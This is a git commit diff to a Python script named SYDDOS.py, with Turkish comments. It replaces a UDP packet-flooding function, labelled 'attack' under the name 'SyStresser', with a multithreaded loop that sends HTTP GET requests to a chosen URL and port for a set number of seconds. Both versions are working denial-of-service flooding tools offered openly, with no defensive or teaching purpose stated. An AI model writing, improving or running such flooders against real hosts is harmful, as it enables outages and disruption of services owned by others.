c6c749d5b4d91143240f945e7bf1faab37b75533
TheSyrox <80204080+TheSyrox@users.noreply.github.com>
2023-10-05 15:12:48 +0300

    Update SYDDOS.py

--- SYDDOS.py
+++ SYDDOS.py
@@ -1,25 +1,36 @@
-import socket
 import argparse
+import threading
+import requests
 import time
 
-def attack(ip, port, paket_sayisi, saniye):
-    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sayac = 0
-    while True:
-        udp.sendto(b"Packet", (ip, port))
-        sayac += 1
-        print("Gönderilen paket sayısı: ", sayac)
-        if sayac == paket_sayisi:
-            break
-        time.sleep(saniye)
-    udp.close()
-
-parser = argparse.ArgumentParser(description="SyStresser")
-parser.add_argument("-u", "--url", dest="ip", help="Hedef IP adresi")
-parser.add_argument("-p", "--port", dest="port", type=int, help="Hedef port")
-parser.add_argument("-n", "--number", dest="paket_sayisi", type=int, help="Gönderilecek paket sayısı")
-parser.add_argument("-s", "--seconds", dest="saniye", type=int, help="Gönderim arasındaki süre (saniye)")
-
+# Argümanları işleme
+parser = argparse.ArgumentParser(description='HTTP isteği gönderen program')
+parser.add_argument('--url', required=True, help='İstek gönderilecek URL')
+parser.add_argument('--port', type=int, required=True, help='Bağlanılacak port')
+parser.add_argument('--time', type=int, required=True, help='İsteklerin süresi (saniye)')
+parser.add_argument('--threads', type=int, default=1, help='Eşzamanlı istek gönderilecek thread sayısı')
 args = parser.parse_args()
 
-attack(args.ip, args.port, args.paket_sayisi, args.saniye)
+# İstek gönderen işlev
+def send_request(url, port, duration):
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        try:
+            response = requests.get(f'http://{url}:{port}')
+            if response.status_code == 200:
+                print(f'Başarılı istek gönderildi: {url}:{port}')
+        except Exception as e:
+            print(f'Hata oluştu: {e}')
+
+# Thread'leri oluştur ve başlat
+threads = []
+for _ in range(args.threads):
+    t = threading.Thread(target=send_request, args=(args.url, args.port, args.time))
+    threads.append(t)
+    t.start()
+
+# Thread'lerin tamamlanmasını bekle
+for t in threads:
+    t.join()
+
+print('İstekler tamamlandı.')
